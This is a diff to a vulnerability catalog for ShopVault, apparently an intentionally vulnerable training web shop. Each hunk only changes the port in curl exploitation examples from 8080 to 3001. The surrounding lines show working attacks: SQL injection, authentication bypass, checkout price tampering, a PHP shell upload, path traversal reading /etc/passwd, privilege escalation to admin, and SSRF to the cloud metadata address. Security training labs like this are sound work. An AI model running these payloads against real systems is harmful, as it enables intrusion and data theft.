@@ -264,10 +264,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Extract all table names
-  curl "http://localhost:8080/api/products/search?q='+UNION+SELECT+1,name,3,4,5,6,7+FROM+sqlite_master+WHERE+type='table'--"
+  curl "http://localhost:3001/api/products/search?q='+UNION+SELECT+1,name,3,4,5,6,7+FROM+sqlite_master+WHERE+type='table'--"
 
   # Bypass authentication by extracting user data
-  curl "http://localhost:8080/api/products/search?q='+UNION+SELECT+id,email,password_hash,full_name,5,6,7+FROM+users--"
+  curl "http://localhost:3001/api/products/search?q='+UNION+SELECT+id,email,password_hash,full_name,5,6,7+FROM+users--"
   ```
 
 - **Fix**:
@@ -294,12 +294,12 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Login as admin without password
-  curl -X POST http://localhost:8080/api/auth/login \
+  curl -X POST http://localhost:3001/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"email": "admin@shopvault.com'\''--", "password": "anything"}'
 
   # Or using OR 1=1
-  curl -X POST http://localhost:8080/api/auth/login \
+  curl -X POST http://localhost:3001/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"email": "'\'' OR 1=1--", "password": "anything"}'
   ```
@@ -328,11 +328,11 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   ```bash
   # Extract other tables via UNION
   curl -H "Authorization: Bearer <token>" \
-    "http://localhost:8080/api/admin/orders?user_id=1+UNION+SELECT+1,2,email,4,5,6,7,8,9,10,11+FROM+users--"
+    "http://localhost:3001/api/admin/orders?user_id=1+UNION+SELECT+1,2,email,4,5,6,7,8,9,10,11+FROM+users--"
 
   # Blind SQLi via status parameter
   curl -H "Authorization: Bearer <token>" \
-    "http://localhost:8080/api/admin/orders?status=pending'+OR+1=1--"
+    "http://localhost:3001/api/admin/orders?status=pending'+OR+1=1--"
   ```
 
 - **Fix**:
@@ -467,7 +467,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Description**: The checkout endpoint accepts client-provided prices for each cart item without verifying them against the database. An attacker can modify the price in the request to pay an arbitrary amount for any product.
 - **Exploitation**:
   ```bash
-  curl -X POST http://localhost:8080/api/cart/checkout \
+  curl -X POST http://localhost:3001/api/cart/checkout \
     -H 'Authorization: Bearer <token>' \
     -H 'Content-Type: application/json' \
     -d '{
@@ -498,7 +498,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Description**: The checkout endpoint does not validate that the quantity of each item is positive. Setting a negative quantity results in a negative total, effectively crediting the user's "purchase."
 - **Exploitation**:
   ```bash
-  curl -X POST http://localhost:8080/api/cart/checkout \
+  curl -X POST http://localhost:3001/api/cart/checkout \
     -H 'Authorization: Bearer <token>' \
     -H 'Content-Type: application/json' \
     -d '{
@@ -569,7 +569,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Location**: `docker-compose.yml`, `GIN_MODE=debug` environment variable
 - **Description**: The Gin framework runs in debug mode in the Docker Compose setup. Debug mode prints every request to stdout, including sensitive headers and request bodies. In production, this would leak sensitive data (passwords, tokens, credit card numbers) into container logs.
 - **Exploitation**:
-  1. `curl -X POST http://localhost:8080/api/auth/login -d '{"email":"admin@shopvault.com","password":"admin123"}'`
+  1. `curl -X POST http://localhost:3001/api/auth/login -d '{"email":"admin@shopvault.com","password":"admin123"}'`
   2. Check Docker logs: `docker compose logs backend`
   3. The password is logged in plaintext (see also A09-B1)
 - **Fix**:
@@ -604,7 +604,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Location**: `backend/cmd/server/main.go`, static file serving configuration
 - **Description**: The `/uploads/` directory is served using `r.StaticFS("/uploads", http.Dir("./uploads"))` which enables directory listing. Anyone can browse the file listing at `/uploads/` and discover all uploaded files including potentially malicious content.
 - **Exploitation**:
-  1. `GET http://localhost:8080/uploads/` — lists all files in the uploads directory
+  1. `GET http://localhost:3001/uploads/` — lists all files in the uploads directory
 - **Fix**:
 
 ```diff
@@ -634,7 +634,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Location**: `backend/cmd/server/main.go`, Gin router initialization
 - **Description**: The application does not set any security-related HTTP headers: no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, no Strict-Transport-Security. This leaves the application vulnerable to clickjacking, MIME-type sniffing, and inline script injection.
 - **Exploitation**:
-  1. `curl -I http://localhost:8080/api/products`
+  1. `curl -I http://localhost:3001/api/products`
   2. No CSP, X-Frame-Options, or other security headers are present
   3. Combined with XSS (A03), no defense-in-depth exists
 - **Fix**:
@@ -1079,7 +1079,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Description**: The file upload endpoint does not validate the Content-Type or file extension of uploaded files. Any file type (PHP scripts, executables, HTML) can be uploaded to the server.
 - **Exploitation**:
   1. Login as admin
-  2. `curl -X POST http://localhost:8080/api/upload -F "file=@shell.php"`
+  2. `curl -X POST http://localhost:3001/api/upload -F "file=@shell.php"`
   3. The PHP file is uploaded and accessible via `/uploads/shell.php`
 - **Fix**:
 
@@ -1277,13 +1277,13 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Read /etc/passwd from the container
-  curl "http://localhost:8080/api/files/view?path=../../../etc/passwd"
+  curl "http://localhost:3001/api/files/view?path=../../../etc/passwd"
 
   # Read the SQLite database with all user data
-  curl "http://localhost:8080/api/files/view?path=../shopvault.db" -o shopvault.db
+  curl "http://localhost:3001/api/files/view?path=../shopvault.db" -o shopvault.db
 
   # Read Go source code
-  curl "http://localhost:8080/api/files/view?path=../internal/handlers/auth.go"
+  curl "http://localhost:3001/api/files/view?path=../internal/handlers/auth.go"
   ```
 
 - **Fix**:
@@ -1339,18 +1339,18 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Login as a regular user (customer@example.com / customer123)
-  TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
+  TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"customer@example.com","password":"customer123"}' | jq -r '.token')
 
   # Escalate to admin
-  curl -X PUT http://localhost:8080/api/profile \
+  curl -X PUT http://localhost:3001/api/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"role": "admin"}'
 
   # Verify — get a new token with admin role
-  curl -s -X POST http://localhost:8080/api/auth/login \
+  curl -s -X POST http://localhost:3001/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"customer@example.com","password":"customer123"}' | jq '.user.role'
   # Returns: "admin"
@@ -1380,11 +1380,11 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Login as admin and set a custom JWT secret
-  ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
+  ADMIN_TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"admin@shopvault.com","password":"admin123"}' | jq -r '.token')
 
-  curl -X POST http://localhost:8080/api/admin/settings \
+  curl -X POST http://localhost:3001/api/admin/settings \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"jwt_secret": "evil"}'
@@ -1422,13 +1422,13 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Access internal services
-  curl -X POST http://localhost:8080/api/admin/import \
+  curl -X POST http://localhost:3001/api/admin/import \
     -H 'Authorization: Bearer <admin_token>' \
     -H 'Content-Type: application/json' \
-    -d '{"url": "http://localhost:8080/api/admin/users"}'
+    -d '{"url": "http://localhost:3001/api/admin/users"}'
 
   # AWS metadata (if running on EC2)
-  curl -X POST http://localhost:8080/api/admin/import \
+  curl -X POST http://localhost:3001/api/admin/import \
     -H 'Authorization: Bearer <admin_token>' \
     -H 'Content-Type: application/json' \
     -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
@@ -1459,10 +1459,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
   ```bash
   # Access internal admin endpoints
-  curl "http://localhost:8080/api/products/image-proxy?url=http://localhost:8080/api/admin/users"
+  curl "http://localhost:3001/api/products/image-proxy?url=http://localhost:3001/api/admin/users"
 
   # Scan internal ports
-  curl "http://localhost:8080/api/products/image-proxy?url=http://127.0.0.1:5432"
+  curl "http://localhost:3001/api/products/image-proxy?url=http://127.0.0.1:5432"
   ```
 
 - **Fix**:
@@ -1486,7 +1486,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Description**: The `/api/webhook/payment-callback` endpoint accepts a `callback_url` in the request body and makes an HTTP GET request to it without any validation. This endpoint requires no authentication, allowing anyone to trigger SSRF requests from the server.
 - **Exploitation**:
   ```bash
-  curl -X POST http://localhost:8080/api/webhook/payment-callback \
+  curl -X POST http://localhost:3001/api/webhook/payment-callback \
     -H 'Content-Type: application/json' \
     -d '{"callback_url": "http://169.254.169.254/latest/meta-data/"}'
   ```
